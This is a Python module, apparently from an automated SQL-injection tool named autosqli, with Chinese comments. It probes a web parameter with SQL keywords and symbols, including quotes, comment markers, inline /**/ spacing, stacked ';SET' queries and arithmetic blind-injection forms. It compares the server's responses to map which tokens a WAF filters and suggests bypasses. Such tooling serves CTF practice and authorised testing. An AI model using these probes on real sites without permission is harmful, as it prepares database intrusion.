"""WAF 检测：字典 fuzz + 响应差异判定，输出过滤清单。

判定模型（三类参照响应）：
- R_base：正常请求 → payload 中 token 被剥离/转义时响应与之高度一致
- R_err ：SQL 报错页  → token 到达解析器时（无论如何都会语法报错）
- block ：WAF 拦截特征（状态码/关键词/用户自定义特征/响应聚类）

通用探针：base+closure+token+comment
  → SQL 报错        = token 通过（可用）
  → 与基线一致       = token 被剥离/转义（已过滤）
  → WAF 拦截特征    = 已过滤（激进拦截）
  → 其他            = 未知；扫描结束后做响应聚类——多个 token 命中彼此
                      一致且显著偏离基线的异常页 → 判定自定义文案拦截页
                      （拦截页格式无关的兜底识别，不依赖内置关键词）
"""
from __future__ import annotations

import re
import sys
from pathlib import Path
from typing import Optional

import yaml

from .models import (BYPASS_SUGGESTIONS, InjectionPoint, ResponseInfo,
                     WAF_BLOCK_PATTERNS, WAF_BLOCK_STATUS, WafItem,
                     WafReport, sig_match, similarity)
from .session import HttpSession

# PyInstaller frozen 模式下资源解压在 _MEIPASS/autosqli/dictionaries
if hasattr(sys, "_MEIPASS"):
    DICT_DIR = Path(sys._MEIPASS) / "autosqli" / "dictionaries"
else:
    DICT_DIR = Path(__file__).resolve().parent.parent / "dictionaries"


def _page_sample(r: ResponseInfo) -> str:
    """提取拦截页的差异文案样本（alert 优先，否则剥标签取正文开头）。"""
    m = re.search(r"alert\((['\"])(.*?)\1\)", r.body, re.S)
    if m:
        return m.group(2)[:40]
    text = re.sub(r"<[^>]+>", " ", r.body)
    return re.sub(r"\s+", " ", text).strip()[:40]


def _cluster_others(others: list, r_base: ResponseInfo, log) -> int:
    """对「响应特征不明确」的探针做聚类：彼此一致(≥0.98)且显著偏离基线
    (<0.96) 的簇（≥2 个 token）判为自定义文案的 WAF 拦截页。
    others: [(WafItem, ResponseInfo)]；命中项就地改写。返回命中数。"""
    clusters: list = []            # [参照响应, [(item, resp), ...]]
    for item, resp in others:
        if resp.status_code < 0 or resp.has_sql_error():
            continue
        for c in clusters:
            if resp.status_code == c[0].status_code \
                    and similarity(resp, c[0]) >= 0.98:
                c[1].append((item, resp))
                break
        else:
            clusters.append([resp, [(item, resp)]])
    hit = 0
    for ref, members in clusters:
        if len(members) < 2 or similarity(ref, r_base) >= 0.96:
            continue
        sample = _page_sample(ref)
        for item, _ in members:
            item.filtered = True
            item.evidence = (f"拦截页聚类识别（未匹配已知特征）: {len(members)} 个 "
                             f"token 命中同一异常页 [{sample}]，与基线相似度 "
                             f"{similarity(ref, r_base):.2f}")
        hit += len(members)
        log("INFO", f"[WAF] 聚类识别到自定义拦截页（{len(members)} token）: {sample}")
    return hit


# 按参数黑名单快扫的 token 集（模拟 CTF 选手手工逐关键字测试的最小集）
QUICK_TOKENS = ["union", "select", "and", "or", "not", "order",
                "information_schema", "'", '"', "#", "--", ",", ";", "/*",
                "=", " "]
_QUICK_SKIP = {"submit", "login", "button", "token", "user_token", "csrf"}


def quick_param_scan(session: HttpSession, report: WafReport,
                     params: Optional[list] = None) -> int:
    """按参数黑名单快扫：对（默认为注入参数以外的）每个表单字段直接发送
    token 原文，与该参数自身基线比对。WAF 常按参数分别过滤（如登录框只查
    uname、不查 passwd），只扫注入参数会漏掉整块防护。

    判定：命中拦截特征（内置/用户自定义，按该参数基线否决误伤特征）→ 已过滤；
    与基线一致 → token 原文放行；彼此一致的异常页 → 聚类判拦截页。
    结果入 report.param_items（信息展示，不参与注入参数的 payload 决策）。
    返回新增条目数。"""
    spec = session.spec
    all_params = list(spec.body_params) + list(spec.params)
    if params is None:
        params = [p for p in all_params
                  if p != spec.param and p.lower() not in _QUICK_SKIP]
    n = 0
    for p in params:
        if session.stopped:
            break
        base_val = str(spec.body_params.get(p, spec.params.get(p, "1")))
        r_base = session.request_value(base_val, param=p)
        base_low = r_base.body.lower()
        # 命中该参数基线页面的特征无区分度（如页面文案本身含"注入"）→ 停用
        pats = [q for q in WAF_BLOCK_PATTERNS if not re.search(q, base_low, re.I)]
        sigs = [s for s in (spec.waf_signatures or [])
                if not sig_match(base_low, s)]
        others = []
        for tok in QUICK_TOKENS:
            if session.stopped:
                break
            val = tok if re.fullmatch(r"\w+", tok) else ("1 1" if tok == " " else f"1{tok}")
            r = session.request_value(val, param=p)
            item = WafItem(token=tok,
                           category="关键字" if re.fullmatch(r"\w+", tok) else "符号",
                           filtered=None,
                           param=p, suggestion=BYPASS_SUGGESTIONS.get(tok, ""))
            report.add_param_item(item)
            n += 1
            if r.status_code < 0:
                item.filtered, item.evidence = None, "请求失败"
            elif r.status_code in WAF_BLOCK_STATUS \
                    or any(re.search(q, r.body.lower(), re.I) for q in pats) \
                    or any(sig_match(r.body.lower(), s) for s in sigs):
                item.filtered = True
                item.evidence = (f"触发拦截（参数 {p} 上发送 token 原文即命中拦截特征）"
                                 f" [{_page_sample(r)}]")
            elif r.has_sql_error():
                item.filtered = False
                item.evidence = f"SQL 报错（token 原文进入解析器，参数 {p} 语义活跃）"
            elif similarity(r, r_base) >= 0.985 and r.status_code == r_base.status_code:
                item.filtered = False
                item.evidence = f"token 原文放行（响应与参数 {p} 基线一致）"
            else:
                item.filtered = None
                item.evidence = "响应特征不明确"
                others.append((item, r))
            session.log("INFO", f"[WAF] 参数 {p} token {tok!r}: {item.status_text}")
        _cluster_others(others, r_base, session.log)
    return n


class WafScanner:
    def __init__(self, session: HttpSession, injection: InjectionPoint,
                 R_base: Optional[ResponseInfo] = None,
                 R_err: Optional[ResponseInfo] = None):
        self.s = session
        self.inj = injection
        self.log = session.log
        self.param = injection.param or session.spec.param
        self.R_base = R_base or session.request_value(session.spec.base_value,
                                                      param=self.param)
        if R_err is not None:
            self.R_err = R_err
        else:
            pre = self._prefix()
            self.R_err = session.request_value(pre, param=self.param)  # 闭合本身 → 报错参照
        # 报错参照有效吗？（登录框吞错/无区分环境下 R_err ≡ R_base，"error/base"
        # 二分失效，此时 base 类结果只能记"未知"）
        self.err_valid = (self.R_err.has_sql_error()
                          or similarity(self.R_err, self.R_base) < 0.99)
        self.kw_dict = self._load("waf_keywords.yaml")
        self.sym_dict = self._load("waf_symbols.yaml")
        self._others: list = []      # 未定类探针 [(item, resp)]，供扫描后聚类
        self._base_kw: list = []     # 无报错环境下落入 base 类的关键字/函数，供语义二次探针

    # ------------------------------------------------------------------ helpers
    @staticmethod
    def _load(name):
        with open(DICT_DIR / name, encoding="utf-8") as f:
            return yaml.safe_load(f)

    def _prefix(self) -> str:
        if self.inj.numeric:
            return self.inj.base_value
        return self.inj.base_value + self.inj.closure

    def _tail(self) -> str:
        return self.inj.tail_literal()

    def _classify(self, r: ResponseInfo) -> str:
        if r.status_code < 0:
            return "other"
        if r.has_waf_block():
            return "block"
        if r.has_sql_error():
            return "error"
        if self.err_valid and self.R_err is not None and self.R_err.length and \
                similarity(r, self.R_err) >= 0.93 and r.status_code == self.R_err.status_code:
            return "error"
        if similarity(r, self.R_base) >= 0.985 and r.status_code == self.R_base.status_code:
            return "base"
        return "other"

    def _record(self, report: WafReport, token: str, category: str, cls: str,
                note: str = "", trust: bool = False,
                r: Optional[ResponseInfo] = None) -> WafItem:
        """trust=True 表示结论来自自参照法（独立成功参照），不受 err_valid 影响。
        r=探针响应：未定类（其他）时登记，扫描结束后参与聚类分析。"""
        if cls == "error":
            filtered, ev = False, f"token 到达数据库解析器（SQL 报错）{note}"
        elif cls == "block":
            filtered, ev = True, f"触发拦截（WAF 特征响应）{note}"
        elif cls == "base":
            if self.err_valid or trust:
                filtered, ev = True, f"token 被剥离/转义（响应与正常基线一致）{note}"
            else:
                # 无报错区分度的环境（登录框吞错等）：语义不可见 ≠ 被剥离
                filtered, ev = None, "无报错回显，无法区分「语义不可见」与「被剥离」"
        else:
            # other：既非基线也非 SQL 报错。err_valid 环境下 kw 探针应报错而未报错
            # → 强烈暗示被 WAF 拦截（如强网杯 preg_match 返回默认页）
            if self.err_valid:
                filtered, ev = True, "疑似 WAF 拦截（应触发 SQL 报错而未报错，响应异于基线）"
            else:
                filtered, ev = None, "响应特征不明确"
        item = WafItem(token=token, category=category, filtered=filtered,
                       evidence=ev, suggestion=BYPASS_SUGGESTIONS.get(token, ""),
                       param=self.param)
        report.add(item)
        if item.filtered is None and r is not None:
            self._others.append((item, r))
        if item.filtered is None and category != "符号":
            self._base_kw.append((item, token, category))
        self.log("INFO", f"[WAF] {self.param}.{token!r}: {item.status_text} ({cls})")
        return item

    # ------------------------------------------------------------------ main
    def scan(self, keywords: bool = True, functions: bool = True,
             symbols: bool = True) -> WafReport:
        report = WafReport()
        pre, tail = self._prefix(), self._tail()

        if keywords:
            for e in self.kw_dict["keywords"]:
                if self.s.stopped:
                    break
                self._probe_generic(report, e["token"], e["category"], pre, tail)
        if functions:
            for e in self.kw_dict["functions"]:
                if self.s.stopped:
                    break
                self._probe_generic(report, e["token"], e["category"], pre, tail)
        if symbols:
            for e in self.sym_dict["symbols"]:
                if self.s.stopped:
                    break
                self._probe_symbol(report, e["token"], pre, tail)

        # 拦截页格式无关的兜底：未定类探针彼此一致且显著偏离基线 → 拦截页聚类
        # 减法形态 + 无报错环境：'-0-' 零页参照先行——关键字走语义二次探针，
        # 其余未定项与零页一致 = token 到达解析器且表达式值为 0（放行），
        # 避免这类探针被误聚类成拦截页
        r_zero = None
        if not self.err_valid and getattr(self.inj, "form", "") == "arith":
            r_zero = self._req(f"{pre}-0-'")
        if self._base_kw and r_zero is not None and r_zero.status_code > 0:
            self._semantic_keywords(pre, r_zero)
        others = [(i, r) for (i, r) in self._others if i.filtered is None]
        if others and r_zero is not None and r_zero.status_code > 0:
            still = []
            for item, r in others:
                if r.status_code > 0 \
                        and similarity(r, r_zero) >= 0.985 \
                        and r.status_code == r_zero.status_code:
                    item.filtered = False
                    item.evidence = "与零页一致（token 到达解析器，表达式值为 0；" \
                                    "若被 str_replace 剥离结果相同，通道实测会暴露）"
                    self.log("INFO", f"[WAF] 零页参照 {self.param}.{item.token!r}: 可用")
                else:
                    still.append((item, r))
            others = still
        if others:
            _cluster_others(others, self.R_base, self.log)
        n = len(report.filtered_list())
        self.log("INFO", f"WAF 扫描完成（参数 {self.param}）: "
                         f"{len(report.items)} 项中 {n} 项被过滤"
                 + ("" if n else "（未检出过滤，疑似无 WAF）"))
        return report

    def _semantic_keywords(self, pre: str, r_zero: ResponseInfo):
        """无报错回显 + 减法盲注环境的关键字定论（剥离参照法）。

        '-0-{token}-'：token 被 WAF 剥离 → 表达式退化为 '-0--'（值 0，与
        零页参照一致）；token 到达解析器 → 表达式语法错（报错被吞 → 与基线
        同页）；token 被拦 → 拦截页。以此三态把 base 类未知项定论，解决
        「语义不可见 vs 被剥离」无法区分的问题。"""
        for item, token, _category in self._base_kw:
            r = self._req(f"{pre}-0-{token}-'")
            if r.status_code < 0:
                continue
            if r.has_waf_block():
                item.filtered = True
                item.evidence = f"触发拦截（语义探针 -0-{token}- 命中拦截特征）"
            elif similarity(r, r_zero) >= 0.985 and r.status_code == r_zero.status_code:
                item.filtered = True
                item.evidence = "token 被剥离/转义（语义探针与零页参照一致）"
            elif similarity(r, self.R_base) >= 0.98 \
                    and r.status_code == self.R_base.status_code:
                item.filtered = False
                item.evidence = "token 到达解析器（语义探针引发语法错，报错被吞）"
            else:
                pass          # 异常第三方页：保持未知，交由聚类兜底
            self.log("INFO", f"[WAF] 语义探针 {self.param}.{token!r}: {item.status_text}")

    def _req(self, payload: str) -> ResponseInfo:
        """向被测参数（按参数定向）发送 payload。"""
        return self.s.request_value(payload, param=self.param)

    def _probe_generic(self, report: WafReport, token: str, category: str,
                       pre: str, tail: str):
        payload = f"{pre}{token}{tail}"          # 如 1'and# → 报错=通过；1'# → 正常=被剥离
        r = self._req(payload)
        self._record(report, token, category, self._classify(r), r=r)

    def _probe_symbol(self, report: WafReport, token: str, pre: str, tail: str):
        special = {
            "space": self._probe_space,
            "'": self._probe_single_quote,
            '"': self._probe_double_quote,
            "#": self._probe_hash,
            "--": self._probe_dashdash,
            "/*": self._probe_inline,
            ";": self._probe_semicolon,
            ",": self._probe_comma,
        }
        if token in special:
            special[token](report, token, pre, tail)
        else:
            payload = f"{pre}{token}{tail}"      # 如 1',# → 报错=通过
            r = self._req(payload)
            self._record(report, token, "符号", self._classify(r), r=r)

    # ------------------------------------------------------------------ special probes
    def _probe_space(self, report: WafReport, token: str, pre: str, tail: str):
        """空格探针（自参照法，无条件执行）：
        以无空格恒真的响应为成功参照 R_true（xor 形态用 1^(1=1)——
        数字型 1or(1=1) 会粘连语法错），含空格恒真与之相似 = 通过；否则被滤。
        空格被滤时继续探测空白替代 %09 / %0a。"""
        form = getattr(self.inj, "form", "classic") or "classic"
        if form == "arith":
            # 减法形态：'-0-' 语义已知，含空格减法式与之比对
            # （尾部硬编码 ' 而非 tail_literal——tail 的 -' 会拼出被拦的 --）
            r_true = self._req(f"{pre}-(1)-'")
            r = self._req(f"{pre}- (1)-'")
            if r_true.status_code > 0 and not r_true.has_waf_block():
                if similarity(r, r_true) >= 0.95 and r.status_code == r_true.status_code:
                    self._record(report, token, "符号", "error",
                                 note="（含空格减法式与无空格一致，空格可用）",
                                 trust=True, r=r)
                else:
                    self._record(report, token, "符号", "base",
                                 note="（含空格式偏离参照，空格被过滤/拦截）",
                                 trust=True, r=r)
                return
            self._record(report, token, "符号", "other",
                         note="（参照构造失败）", r=r_true)
            return
        if form == "xor":
            r_true = self._req(f"{pre}^(1=1){tail}")
        else:
            r_true = self._req(f"{pre}or(1=1){tail}")
        if r_true.status_code > 0 and not r_true.has_waf_block() \
                and not r_true.has_sql_error():
            r = self._req(f"{pre} or 1{tail}")
            if similarity(r, r_true) >= 0.95 and r.status_code == r_true.status_code:
                self._record(report, token, "符号", "error",
                             note="（含空格恒真与无空格恒真页面一致）", trust=True, r=r)
                return
            self._record(report, token, "符号", "base",
                         note="（含空格恒真页面偏离成功参照，空格被过滤/拦截）",
                         trust=True, r=r)
            self._probe_whitespace_alts(report, pre, tail, r_true)
            return
        # or 恒真不可用（如 or 被滤）→ and 真假差异兜底
        and_item = report.lookup("and")
        if and_item is not None and and_item.filtered is False:
            t = self._req(f"{pre} and 1=1{tail}")
            f = self._req(f"{pre} and 1=2{tail}")
            if (self._classify(t) == "base" and t.status_code > 0
                    and (similarity(t, f) < 0.995 or t.status_code != f.status_code)):
                self._record(report, token, "符号", "error")
                return
        self._record(report, token, "符号", "other", note="（无法构造有效恒真参照）")

    def _probe_whitespace_alts(self, report: WafReport, pre: str, tail: str,
                               r_true):
        """空格被滤时，探测 tab(%09) / 换行(%0a) 是否可作为空白替代。"""
        for name, literal in (("%09", "\t"), ("%0a", "\n")):
            r = self._req(f"{pre}{literal}or{literal}1{tail}")
            if similarity(r, r_true) >= 0.95 and r.status_code == r_true.status_code:
                self._record(report, name, "符号", "error",
                             note="（空白替代字符可用，自参照恒真一致）", trust=True, r=r)
            else:
                self._record(report, name, "符号", "base",
                             note="（空白替代字符同样被拦截）", trust=True, r=r)

    def _probe_single_quote(self, report: WafReport, token: str, pre: str, tail: str):
        if getattr(self.inj, "form", "classic") == "arith" \
                and self.inj.closure == "'":
            self._record(report, token, "符号", "error",
                         note="（减法盲注闭合即依赖引号逃逸，引号可用）", trust=True)
            return
        r = self._req(self.inj.base_value + "'")
        cls = self._classify(r)
        if cls == "error":
            self._record(report, token, "符号", "error", r=r)
            return
        # 自参照法：无引号恒真（or）vs 含引号恒真（'a'='a'）页面比对
        # （用 or 而非 and——and 被滤环境下 and 参照自身即拦截页，恒相似导致误判可用）
        r_ref = self._req(f"{pre}/**/or/**/(1=1){tail}")
        if r_ref.status_code > 0 and r_ref.has_waf_block():
            # 参照自身被拦截 → 相似度比对无意义（双拦截页恒相似会误判"可用"）
            self._record(report, token, "符号", None,
                         note="（自参照探针被拦截，无法判定；请以闭合探测结果为准）",
                         r=r)
            return
        r_quote = self._req(f"{pre}/**/or/**/('a'='a'){tail}")
        if r_ref.status_code > 0 and similarity(r_ref, r_quote) >= 0.98 \
                and r_ref.status_code == r_quote.status_code:
            self._record(report, token, "符号", "error",
                         note="（含引号恒真与无引号恒真一致，引号可用）", trust=True, r=r_quote)
        elif r_ref.status_code > 0 and similarity(r_ref, r_quote) < 0.95:
            self._record(report, token, "符号", "base",
                         note="（含引号恒真失败而无引号恒真成功，引号被过滤/剥离）",
                         trust=True, r=r_quote)
        elif not self.err_valid:
            self._record(report, token, "符号", None,
                         note="（无报错回显，请以闭合探测结果为准）", r=r)
        else:
            self._record(report, token, "符号", "base",
                         note="（引号被转义或过滤，字符串逃逸失败）", r=r)

    def _probe_double_quote(self, report: WafReport, token: str, pre: str, tail: str):
        r = self._req(self.inj.base_value + '"')
        cls = self._classify(r)
        if cls == "error":
            self._record(report, token, "符号", "error", r=r)
        elif self.inj.closure.startswith("'"):
            # 单引号上下文中 " 本就是普通数据（合法不报错），无区分度
            self._record(report, token, "符号", None,
                         note="（当前为单引号闭合，双引号作为数据处理）", r=r)
        else:
            self._record(report, token, "符号", cls, r=r)

    def _probe_hash(self, report: WafReport, token: str, pre: str, tail: str):
        """1'# → 正常=通过；报错=被剥离；拦截=被过滤。"""
        r = self._req(f"{pre}#")
        cls = self._classify(r)
        if cls == "base":
            self._record(report, token, "符号", "error", r=r)   # 通过（语义上可用）
        elif cls == "error":
            self._record(report, token, "符号", "base", note="（# 被剥离，残留引号报错）", r=r)
        else:
            self._record(report, token, "符号", cls, r=r)

    def _probe_dashdash(self, report: WafReport, token: str, pre: str, tail: str):
        r = self._req(f"{pre}-- ")
        cls = self._classify(r)
        if cls == "base":
            self._record(report, token, "符号", "error", r=r)
        elif cls == "error":
            self._record(report, token, "符号", "base", note="（-- 被剥离）", r=r)
        else:
            self._record(report, token, "符号", cls, r=r)

    def _probe_inline(self, report: WafReport, token: str, pre: str, tail: str):
        """MariaDB 未闭合 /* 自身报错，改用完整内联注释替代空格：
        1'/**/order/**/by/**/3# → 报错=/**/ 生效（可用）。"""
        if report.lookup("order") and report.lookup("order").filtered:
            self._record(report, token, "符号", "other", note="（order 不可用，无法判定）")
            return
        r = self._req(f"{pre}/**/order/**/by/**/3{tail}")
        cls = self._classify(r)
        if cls == "error":
            self._record(report, token, "符号", "error",
                         note="（order by 3 必报错，说明 /**/ 作为空格替代生效）", r=r)
        elif cls == "block":
            self._record(report, token, "符号", "block", r=r)
        elif cls == "base":
            self._record(report, token, "符号", "base",
                         note="（order by 3 未报错，/**/ 疑似被剥离或失效）", r=r)
        else:
            self._record(report, token, "符号", "other", r=r)

    def _probe_comma(self, report: WafReport, token: str, pre: str, tail: str):
        """逗号语义探针：比较「含逗号/不含逗号、其余一致」的两式。
        arith：-(0)in(0,1)（值 1）vs -(0)in(1)（值 0）——两态不同=逗号到达解析器。
        classic：or (1)in(0,1) 恒真与 or (1=1) 恒真一致=可用。"""
        form = getattr(self.inj, "form", "classic") or "classic"
        if form == "arith":
            r_c = self._req(f"{pre}-(0)in(0,1)-'")
            r_nc = self._req(f"{pre}-(0)in(1)-'")
            if r_c.status_code > 0 and r_c.has_waf_block():
                self._record(report, token, "符号", "block", r=r_c)
            elif r_nc.status_code < 0 or r_nc.has_waf_block():
                self._record(report, token, "符号", None,
                             note="（无逗号参照被拦截，无法判定）", r=r_c)
            elif similarity(r_c, r_nc) < 0.995 or r_c.status_code != r_nc.status_code:
                self._record(report, token, "符号", "error",
                             note="（in(0,1) 与 in(1) 两态不同，逗号到达解析器）",
                             trust=True, r=r_c)
            else:
                self._record(report, token, "符号", "base",
                             note="（含逗号式与无逗号式页面一致，逗号被过滤/剥离）",
                             trust=True, r=r_c)
            return
        from .detector import apply_form
        r_ref = self._req(f"{pre}{apply_form(' or (1=1)', form)}{tail}")
        r_comma = self._req(f"{pre}{apply_form(' or (1)in(0,1)', form)}{tail}")
        if r_ref.status_code > 0 and r_ref.has_waf_block():
            # 参照自身被拦（or 被滤环境）→ 相似比对无意义
            self._record(report, token, "符号", None,
                         note="（参照探针被拦截，无法判定）", r=r_comma)
            return
        if r_ref.status_code > 0 and similarity(r_comma, r_ref) >= 0.95 \
                and r_comma.status_code == r_ref.status_code:
            self._record(report, token, "符号", "error",
                         note="（in(0,1) 恒真与 or 1=1 一致，逗号可用）", trust=True,
                         r=r_comma)
        else:
            self._record(report, token, "符号", "base",
                         note="（含逗号恒真失败，逗号被过滤）", trust=True, r=r_comma)

    def _probe_semicolon(self, report: WafReport, token: str, pre: str, tail: str):
        """1';SET @a=1# → 正常=分号通过（SET 合法执行）；报错=被剥。
        不依赖 select（其被滤时旧探针会误判分号）。"""
        r = self._req(f"{pre};SET @a=1{tail}")
        cls = self._classify(r)
        if cls == "base":
            self._record(report, token, "符号", "error",
                         note="（SET 语句正常执行，分号到达解析器）", r=r)
        elif cls == "error":
            self._record(report, token, "符号", "base", note="（分号被剥离）", r=r)
        else:
            self._record(report, token, "符号", cls, r=r)
